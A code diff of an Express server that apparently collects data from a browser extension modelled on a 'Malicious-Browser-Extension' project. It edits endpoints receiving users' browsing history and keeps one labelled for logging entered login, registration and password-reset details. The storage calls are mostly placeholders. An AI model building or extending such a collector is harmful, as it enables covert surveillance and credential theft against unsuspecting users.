@@ -54,10 +54,18 @@ app.post(
   "/user/add/",
   catchErrors(
     authed(async (req, res) => {
-      const { uid, extension_id, date_created } = req.body;
+      const { uid, extension_id, version, date_created, history } = req.body;
       // generate date stamp (here or from request?)
 
-      const result = await sd.placeholder(uid, extension_id, date_created);
+      if (!uid) throw new InputError("uid is undefined.");
+
+      const result = await sd.addUser({
+        uid,
+        extension_id,
+        version,
+        date_created,
+        history,
+      });
       res.json({ result: result });
     })
   )
@@ -71,30 +79,18 @@ app.post(
 // https://github.com/nigamaviral/Malicious-Browser-Extension/blob/master/extension/background.js#L228
 // https://stackoverflow.com/a/23854032
 
-// Save saved history data
+// Update history data
 app.post(
-  "/history/saved/",
+  "/history/update/",
   catchErrors(
     authed(async (req, res) => {
-      const { uid, extension_id, date_created } = req.body;
-      // generate date stamp (here or from request?)
-
-      const result = await sd.placeholder(uid, extension_id, date_created);
+      const { uid, date_created, history } = req.body;
+      const result = await sd.placeholder({
+        uid,
+        date_created,
+        history,
+      });
       res.json({ result: result });
-    })
-  )
-);
-
-// Save saved account details
-app.post(
-  "/account/saved/",
-  catchErrors(
-    authed(async (req, res) => {
-      const { uid, date, accounts } = req.body;
-      // generate date stamp (here or from request?)
-
-      const result = await sd.placeholder(uid, date, accounts);
-      res.json({ result });
     })
   )
 );
@@ -102,20 +98,6 @@ app.post(
 // /****************************************************************
 //                        Logging Live Data
 // ****************************************************************/
-
-// Log currently visiting webpages
-app.post(
-  "/history/",
-  catchErrors(
-    authed(async (req, res) => {
-      const { uid, date, url } = req.body;
-      // generate date stamp (here or from request?)
-
-      const result = await sd.placeholder(uid, date, url);
-      res.json({ result });
-    })
-  )
-);
 
 // Log currently entered account details (login/register/reset password)
 app.post(
